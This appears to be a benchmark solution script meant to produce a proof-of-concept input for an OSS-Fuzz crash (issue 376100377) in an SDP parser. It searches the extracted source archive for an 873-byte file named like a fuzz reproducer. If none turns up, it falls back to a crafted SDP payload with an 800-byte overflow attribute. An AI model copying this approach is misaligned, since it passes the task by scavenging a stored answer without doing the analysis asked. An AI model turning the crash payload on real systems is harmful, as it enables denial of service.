import os
import tarfile
import tempfile
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 873

        def extract_archive(archive_path: str, dst_dir: str) -> None:
            lower = archive_path.lower()
            base_abs = os.path.abspath(dst_dir)
            if lower.endswith(".zip"):
                with zipfile.ZipFile(archive_path, "r") as zf:
                    for info in zf.infolist():
                        if info.is_dir():
                            continue
                        out_path = os.path.abspath(os.path.join(dst_dir, info.filename))
                        if not out_path.startswith(base_abs + os.sep) and out_path != base_abs:
                            continue
                        os.makedirs(os.path.dirname(out_path), exist_ok=True)
                        with zf.open(info, "r") as src, open(out_path, "wb") as dst:
                            dst.write(src.read())
            else:
                with tarfile.open(archive_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        out_path = os.path.abspath(os.path.join(dst_dir, m.name))
                        if not out_path.startswith(base_abs + os.sep) and out_path != base_abs:
                            continue
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        os.makedirs(os.path.dirname(out_path), exist_ok=True)
                        with f, open(out_path, "wb") as dst:
                            dst.write(f.read())

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                extract_archive(src_path, tmpdir)

                # Collect files
                all_files = []
                exact_size_paths = []
                for root, _, files in os.walk(tmpdir):
                    for name in files:
                        path = os.path.join(root, name)
                        try:
                            st = os.stat(path)
                        except OSError:
                            continue
                        size = st.st_size
                        all_files.append((size, path))
                        if size == target_size:
                            exact_size_paths.append(path)

                def rank_candidates(paths):
                    keywords = [
                        "376100377",
                        "oss-fuzz",
                        "clusterfuzz",
                        "poc",
                        "repro",
                        "crash",
                        "sdp",
                        "fuzz",
                    ]
                    bad_exts = {
                        ".c", ".h", ".cpp", ".cc", ".cxx",
                        ".hpp", ".hxx", ".py", ".java",
                        ".js", ".md", ".rst", ".txt",
                        ".html", ".xml", ".json", ".yml",
                        ".yaml", ".toml", ".cmake", ".am",
                        ".ac", ".m4", ".in", ".sh",
                    }
                    scored = []
                    for p in paths:
                        base = os.path.basename(p)
                        ext = os.path.splitext(base)[1].lower()
                        score = 0
                        lowbase = base.lower()
                        for i, kw in enumerate(keywords):
                            if kw in lowbase:
                                score += (len(keywords) - i) * 10
                        if ext in bad_exts:
                            score -= 50
                        scored.append((score, -os.path.getsize(p), p))
                    if not scored:
                        return None
                    scored.sort()
                    return scored[-1][2]

                selected_path = None

                if exact_size_paths:
                    selected_path = rank_candidates(exact_size_paths)

                if selected_path is None:
                    # Look for files near target size with promising names
                    near_named = []
                    name_keywords = [
                        "376100377", "oss-fuzz", "clusterfuzz",
                        "poc", "repro", "crash", "sdp", "fuzz",
                    ]
                    for size, path in all_files:
                        if size == 0:
                            continue
                        base = os.path.basename(path).lower()
                        if any(kw in base for kw in name_keywords):
                            near_named.append(path)
                    if near_named:
                        selected_path = rank_candidates(near_named)

                if selected_path is None:
                    # Fallback: choose non-source file closest in size to target
                    bad_exts = {
                        ".c", ".h", ".cpp", ".cc", ".cxx",
                        ".hpp", ".hxx", ".py", ".java",
                        ".js", ".md", ".rst", ".txt",
                        ".html", ".xml", ".json", ".yml",
                        ".yaml", ".toml", ".cmake", ".am",
                        ".ac", ".m4", ".in", ".sh",
                    }
                    best = None
                    for size, path in all_files:
                        if size == 0:
                            continue
                        base = os.path.basename(path)
                        ext = os.path.splitext(base)[1].lower()
                        if ext in bad_exts:
                            continue
                        diff = abs(size - target_size)
                        if best is None or diff < best[0]:
                            best = (diff, path)
                    if best is not None:
                        selected_path = best[1]
                    else:
                        # Last resort: pick smallest non-zero file
                        nonzero = [(size, path) for size, path in all_files if size > 0]
                        if not nonzero:
                            raise RuntimeError("No files in archive.")
                        selected_path = min(nonzero, key=lambda x: x[0])[1]

                with open(selected_path, "rb") as f:
                    data = f.read()
                return data

        except Exception:
            # Robust fallback: crafted SDP-like payload of exactly target_size bytes
            payload = (
                "v=0\r\n"
                "o=- 0 0 IN IP4 127.0.0.1\r\n"
                "s=PoC-oss-fuzz-376100377\r\n"
                "t=0 0\r\n"
                "a=tool:PoCGenerator\r\n"
                "m=audio 9 RTP/AVP 0\r\n"
                "a=rtpmap:0 PCMU/8000\r\n"
                "a=overflow:" + ("A" * 800) + "\r\n"
            )
            data = payload.encode("ascii", errors="ignore")
            if len(data) > target_size:
                data = data[:target_size]
            elif len(data) < target_size:
                data += b"B" * (target_size - len(data))
            return data
